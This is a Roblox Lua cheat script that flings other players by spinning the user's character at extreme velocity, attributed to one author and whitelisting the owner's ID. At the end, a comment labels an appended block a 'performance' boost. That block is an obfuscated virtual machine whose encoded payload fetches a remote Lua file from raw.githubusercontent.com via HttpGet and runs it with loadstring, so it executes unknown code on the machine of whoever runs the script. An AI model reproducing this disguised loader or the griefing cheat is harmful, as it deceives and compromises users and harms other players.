
-- Made by AnthonyIsntHere (got leaked and skids are claiming it as their own LOL)
-- Now supports r15 originalsize rescale!

local Targets = {"All"} -- "All", "Target Name", "arian_was_here"

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local AllBool = false

local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end

local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end

local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart

    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle

    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end

    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
        
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
        
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0

            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
        
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
        
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
        
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Occurred", "Random error", 5)
    end
end

if not Welcome then Message("Script by AnthonyIsntHere", "Enjoy!", 5) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end

if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end

for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 1414978355 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("Error Occurred", "Username Invalid", 5)
    end
end
-- the script for some reason lags for some executors so i thought might as well add a script here to increase performance alot
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v80=0;while true do if (v80==0) then v19=v0(v3(v30,1,1));return "";end end else local v81=v2(v0(v30,16));if v19 then local v89=0;local v90;while true do if (v89==1) then return v90;end if (v89==0) then v90=v5(v81,v19);v19=nil;v89=1;end end else return v81;end end end);local function v20(v31,v32,v33)if v33 then local v82=(v31/((5 -3)^(v32-1)))%((5 -3)^(((v33-1) -(v32-(1 -0))) + (2 -1))) ;return v82-(v82%(620 -(555 + 64))) ;else local v83=931 -(857 + 74) ;local v84;while true do if (v83==0) then v84=(570 -(367 + 201))^(v32-((2565 -(1523 + 114)) -(214 + 713))) ;return (((v31%(v84 + v84))>=v84) and (1 + 0)) or ((877 -(282 + 595)) + 0 + 0) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (1067 -(68 + 997)) );v18=v18 + (1272 -(226 + 1044)) ;return (v36 * (364 -108)) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (12 -9) );v18=v18 + 4 ;return (v40 * ((16778290 -(892 + 65)) -(32 + 85))) + (v39 * ((153212 -88986) + 1310)) + (v38 * (57 + 199)) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,(1 + 0) -(0 -0) ,(36 + 0) -16 ) * ((352 -(87 + 263))^(212 -(67 + 113)))) + v41 ;local v45=v20(v42,21,23 + 8 );local v46=((v20(v42,78 -46 )==(1 + 0)) and  -(792 -(368 + 423))) or (3 -2) ;if (v45==(952 -(802 + 150))) then if (v44==(0 -0)) then return v46 * (0 -0) ;else local v91=0;while true do if (v91==(0 + 0)) then v45=998 -(915 + 82) ;v43=(0 -0) -0 ;break;end end end elseif (v45==(1193 + 854)) then return ((v44==0) and (v46 * ((1 -0)/(1187 -(1069 + 118))))) or (v46 * NaN) ;end return v8(v46,v45-(2320 -1297) ) * (v43 + (v44/((3 -1)^52))) ;end local function v25(v47)local v48;if  not v47 then local v85=18 -(10 + 8) ;while true do if (v85==0) then v47=v23();if (v47==(0 -0)) then return "";end break;end end end v48=v3(v16,v18,(v18 + v47) -(443 -(416 + 26)) );v18=v18 + v47 ;local v49={};for v64=3 -2 , #v48 do v49[v64]=v2(v1(v3(v48,v64,v64)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50=0;local v51;local v52;local v53;local v54;local v55;local v56;local v57;while true do if (v50==(0 -0)) then v51=413 -(15 + 398) ;v52=nil;v50=1;end if (1==v50) then v53=nil;v54=nil;v50=984 -(18 + 964) ;end if (v50~=(11 -8)) then else v57=nil;while true do if (v51~=(1 + 0)) then else local v96=166 -(9 + 157) ;local v97;while true do if (v96==0) then v97=850 -(20 + 830) ;while true do if (v97==0) then local v149=0 -0 ;while true do if (v149==1) then v97=1825 -(1195 + 629) ;break;end if (v149~=(0 + 0)) then else v56=v23();v57={};v149=1 -0 ;end end end if (v97==(243 -(187 + 54))) then v51=1 + 1 ;break;end if ((739 -(542 + 196))==v97) then local v150=780 -(162 + 618) ;while true do if (v150~=0) then else for v164=1 + 0 ,v56 do local v165=0 + 0 ;local v166;local v167;local v168;while true do if ((0 + 0)==v165) then v166=0 -0 ;v167=nil;v165=1;end if (v165==1) then v168=nil;while true do if (v166==(0 -0)) then local v171=0 -0 ;while true do if (v171==0) then v167=v21();v168=nil;v171=1;end if (v171==(2 -1)) then v166=1;break;end end end if (v166==1) then if (v167==(1 + 0)) then v168=v21()~=(405 -(118 + 287)) ;elseif (v167==(1638 -(1373 + 263))) then v168=v24();elseif (v167~=(1003 -(451 + 549))) then else v168=v25();end v57[v164]=v168;break;end end break;end end end v55[11 -8 ]=v21();v150=1;end if ((1 + 0)~=v150) then else v97=2 -0 ;break;end end end end break;end end end if (v51~=2) then else local v98=0 -0 ;while true do if (v98==(1121 -(118 + 1003))) then for v129=1385 -(746 + 638) ,v23() do local v130=0 + 0 ;local v131;while true do if (v130==(377 -(142 + 235))) then v131=v21();if (v20(v131,1,1)~=(0 -0)) then else local v157=0 -0 ;local v158;local v159;local v160;local v161;local v162;local v163;while true do if (v157~=(980 -(553 + 424))) then else while true do if (v158==(342 -(218 + 123))) then local v169=0 + 0 ;while true do if (0==v169) then v161=nil;v162=nil;v169=1582 -(1535 + 46) ;end if (v169~=(1 + 0)) then else v158=1 + 1 ;break;end end end if (0==v158) then local v170=0 + 0 ;while true do if (v170==(1 + 0)) then v158=561 -(306 + 254) ;break;end if (v170==0) then v159=0 + 0 ;v160=nil;v170=1;end end end if (v158~=(4 -2)) then else v163=nil;while true do if (v159~=2) then else while true do if (v160~=2) then else local v175=0 -0 ;local v176;while true do if (v175==(0 -0)) then v176=0;while true do if (v176==(0 + 0)) then local v185=0 -0 ;while true do if (v185==(1468 -(899 + 568))) then v176=1;break;end if (v185~=0) then else if (v20(v162,1 + 0 ,2 -1 )~=1) then else v163[1 + 1 ]=v57[v163[1331 -(797 + 532) ]];end if (v20(v162,2 + 0 ,1 + 1 )==(604 -(268 + 335))) then v163[293 -(60 + 230) ]=v57[v163[3]];end v185=1203 -(373 + 829) ;end end end if (v176==(573 -(426 + 146))) then v160=1 + 2 ;break;end end break;end end end if ((2 + 1)==v160) then if (v20(v162,3,1459 -(282 + 1174) )~=(812 -(569 + 242))) then else v163[11 -7 ]=v57[v163[1 + 3 ]];end v52[v129]=v163;break;end if (v160==1) then local v178=0;local v179;local v180;while true do if (v178==(1024 -(706 + 318))) then v179=1251 -(721 + 530) ;v180=nil;v178=1272 -(945 + 326) ;end if (v178==(1 + 0)) then while true do if (v179~=(0 -0)) then else v180=0;while true do if (v180~=(2 -1)) then else v160=338 -(144 + 192) ;break;end if (v180==(0 + 0)) then local v186=700 -(271 + 429) ;while true do if (0~=v186) then else local v191=0 + 0 ;while true do if (v191~=(0 + 0)) then else v163={v22(),v22(),nil,nil};if (v161==(0 + 0)) then local v192=1171 -(418 + 753) ;while true do if (v192~=(0 + 0)) then else v163[1 + 2 ]=v22();v163[2 + 2 ]=v22();break;end end elseif (v161==(1 + 0)) then v163[3]=v23();elseif (v161==(1 + 1)) then v163[3]=v23() -(2^(545 -(406 + 123))) ;elseif (v161~=3) then else local v197=1769 -(1749 + 20) ;local v198;local v199;while true do if (v197==(1 + 0)) then while true do if (v198~=0) then else v199=1975 -(1913 + 62) ;while true do if (v199~=(0 + 0)) then else v163[7 -4 ]=v23() -(2^16) ;v163[4]=v22();break;end end break;end end break;end if (v197==0) then v198=0;v199=nil;v197=1 + 0 ;end end end v191=3 -2 ;end if (v191==(1662 -(1477 + 184))) then v186=1323 -(1249 + 73) ;break;end end end if (v186~=(1 + 0)) then else v180=857 -(564 + 292) ;break;end end end end break;end end break;end end end if (v160~=(0 + 0)) then else local v181=1145 -(466 + 679) ;local v182;while true do if ((0 -0)==v181) then v182=0 -0 ;while true do if (v182==1) then v160=305 -(244 + 60) ;break;end if (v182==0) then v161=v20(v131,2 + 0 ,479 -(41 + 435) );v162=v20(v131,1005 -(938 + 63) ,17 -11 );v182=1 + 0 ;end end break;end end end end break;end if (v159==(1900 -(106 + 1794))) then local v173=0;while true do if ((0 + 0)==v173) then v160=0;v161=nil;v173=1;end if (v173==1) then v159=1126 -(936 + 189) ;break;end end end if ((1 + 0)==v159) then local v174=0 -0 ;while true do if (v174==0) then v162=nil;v163=nil;v174=2 -1 ;end if (v174==(115 -(4 + 110))) then v159=586 -(57 + 527) ;break;end end end end break;end end break;end if ((1429 -(41 + 1386))==v157) then v162=nil;v163=nil;v157=3;end if (v157==(104 -(17 + 86))) then v160=nil;v161=nil;v157=1140 -(782 + 356) ;end if (v157==(0 + 0)) then v158=0 -0 ;v159=nil;v157=2 -1 ;end end end break;end end end for v132=167 -(122 + 44) ,v23() do v53[v132-(1 -0) ]=v28();end v98=1 -0 ;end if (1~=v98) then else return v55;end end end if (v51==(0 -0)) then local v99=0 + 0 ;local v100;while true do if (v99==0) then v100=0;while true do if (v100==(1877 -(157 + 1718))) then v51=1 + 0 ;break;end if (v100==(1 -0)) then local v151=0;while true do if (v151==1) then v100=6 -4 ;break;end if (v151==(65 -(30 + 35))) then v54={};v55={v52,v53,nil,v54};v151=3 -2 ;end end end if (v100==(1212 -(323 + 889))) then local v152=0 -0 ;while true do if (v152==(2 -1)) then v100=581 -(361 + 219) ;break;end if (v152~=(320 -(53 + 267))) then else v52={};v53={};v152=1;end end end end break;end end end end break;end if (v50~=(1 + 1)) then else v55=nil;v56=nil;v50=5 -2 ;end end end local function v29(v58,v59,v60)local v61=v58[1];local v62=v58[2];local v63=v58[3];return function(...)local v66=v61;local v67=v62;local v68=v63;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v86=0,v74 do if (v86>=v68) then v72[v86-v68 ]=v73[v86 + 1 ];else v76[v86]=v73[v86 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do v78=v66[v70];v79=v78[1];if (v79<=3) then if (v79<=1) then if (v79==0) then do return;end else local v101=0;local v102;local v103;local v104;local v105;while true do if (2==v101) then for v153=v102,v71 do v105=v105 + 1 ;v76[v153]=v103[v105];end break;end if (1==v101) then v71=(v104 + v102) -1 ;v105=0;v101=2;end if (v101==0) then v102=v78[2];v103,v104=v69(v76[v102](v13(v76,v102 + 1 ,v78[3])));v101=1;end end end elseif (v79>2) then if ((v78[3]=="_ENV") or (v78[3]=="getfenv")) then v76[v78[2]]=v60;else v76[v78[2]]=v60[v78[3]];end else v76[v78[2]]();end elseif (v79<=5) then if (v79>4) then local v106;local v107,v108;local v109;local v110;if ((v78[3]=="_ENV") or (v78[3]=="getfenv")) then v76[v78[2]]=v60;else v76[v78[2]]=v60[v78[3]];end v70=v70 + 1 ;v78=v66[v70];if ((v78[3]=="_ENV") or (v78[3]=="getfenv")) then v76[v78[2]]=v60;else v76[v78[2]]=v60[v78[3]];end v70=v70 + 1 ;v78=v66[v70];v110=v78[2];v109=v76[v78[3]];v76[v110 + 1 ]=v109;v76[v110]=v109[v78[4]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v110=v78[2];v107,v108=v69(v76[v110](v13(v76,v110 + 1 ,v78[3])));v71=(v108 + v110) -1 ;v106=0;for v126=v110,v71 do v106=v106 + 1 ;v76[v126]=v107[v106];end v70=v70 + 1 ;v78=v66[v70];v110=v78[2];v76[v110]=v76[v110](v13(v76,v110 + 1 ,v71));v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]();v70=v70 + 1 ;v78=v66[v70];do return;end else local v119=v78[2];v76[v119]=v76[v119](v13(v76,v119 + 1 ,v71));end elseif (v79>6) then local v121=0;local v122;local v123;while true do if (1==v121) then v76[v122 + 1 ]=v123;v76[v122]=v123[v78[4]];break;end if (v121==0) then v122=v78[2];v123=v76[v78[3]];v121=1;end end else v76[v78[2]]=v78[3];end v70=v70 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034E3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F73656B7274652O33342O352O342F526F626C6F782F6D61696E2F6E65772D6F6266757363617465642E6C756100083O0012053O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",v9(),...);